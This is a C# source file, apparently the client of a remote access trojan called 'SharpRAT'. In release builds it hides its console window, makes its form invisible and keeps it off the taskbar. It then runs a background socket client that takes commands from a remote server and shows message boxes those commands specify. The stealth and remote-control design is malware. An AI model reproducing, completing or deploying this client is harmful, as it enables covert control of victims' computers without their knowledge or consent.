
using System.Runtime.InteropServices;

namespace Client
{
    public partial class Main : Form
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        private string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\SharpRAT";
        public static Client.SocketClient socketClient;
        public static RequestUI uiRequests;
        public Main()
        {
            // Debugging purposes, console output visible.
#if (DEBUG)
            ShowWindow(GetConsoleWindow(), SW_SHOW);
#else
            ShowWindow(GetConsoleWindow(), SW_HIDE);
#endif

            uiRequests = new RequestUI();
            socketClient = new Client.SocketClient();
            InitializeComponent();
        }

        private void Main_Load(object sender, EventArgs e)
        {
            // Create directory if it does not exist.
            if (!File.Exists(folderPath))
                Directory.CreateDirectory(folderPath);

            // Load config values if the config exists.
            if (File.Exists(User.Config.GetConfigPath()))
                User.Config.Read();

            Thread clientThread = new(socketClient.ExecuteClient);
            clientThread.IsBackground = true;
            clientThread.Start();

            // Start hidden. (For windows forms applications only)
            Opacity = 0.0f;
            ShowInTaskbar = false;
            MinimizeBox = true;
        }

        void DisplayMessageBox(string commandString)
        {
            string[] stringSplit = commandString.Split("<SPLIT>");

            MessageBoxIcon selectedIcon = MessageBoxIcon.Information;
            switch (int.Parse(stringSplit[2]))
            {
                case 0:
                    selectedIcon = MessageBoxIcon.Exclamation;
                    break;
                case 1:
                    selectedIcon = MessageBoxIcon.Information;
                    break;
                case 2:
                    selectedIcon = MessageBoxIcon.Error;
                    break;
                case 3:
                    selectedIcon = MessageBoxIcon.Question;
                    break;
            }

            // Show messagebox with topmost enabled using form.
            using (Form form = new Form())
            {
                form.TopMost = true;
                MessageBox.Show(form, stringSplit[0], stringSplit[1], MessageBoxButtons.OK, selectedIcon);
            }
        }

        private void uiUpdateTimer_Tick(object sender, EventArgs e)
        {
            int requestID = uiRequests.RequestReceived();
            if (requestID != 0) // Another thread requested UI to update requsted item.
            {
                switch (uiRequests.GetRequestType(requestID)) // Check request type and call the correct function.
                {
                    case RequestUI.RequestType.UI_SHOW_MESSAGEBOX:
                        DisplayMessageBox(uiRequests.GetRequestText(requestID));
                        break;
                }
            }
        }

        private void Main_FormClosing(object sender, FormClosingEventArgs e)
        {
            socketClient.GetServerSocket().Close();
        }
    }
}